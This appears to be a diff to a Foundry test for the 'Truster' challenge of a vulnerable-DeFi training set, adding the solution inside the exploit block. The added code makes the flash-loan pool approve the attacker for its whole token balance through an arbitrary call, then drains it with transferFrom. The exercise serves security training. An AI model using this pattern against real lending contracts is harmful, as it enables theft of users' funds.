@@ -42,6 +42,17 @@ contract Truster is Test {
          * EXPLOIT START *
          */
 
+        // Get pool balance
+        uint256 poolBalance = dvt.balanceOf(address(trusterLenderPool));
+
+        vm.prank(attacker);
+        // Pool approve the attacker to take a free loan.
+        bytes memory callData = abi.encodeWithSignature("approve(address,uint256)", attacker, poolBalance);
+        trusterLenderPool.flashLoan(0, attacker, address(dvt), callData);
+
+        vm.prank(attacker);
+        //Get all the funds.
+        dvt.transferFrom(address(trusterLenderPool), attacker, poolBalance);
         /**
          * EXPLOIT END *
          */
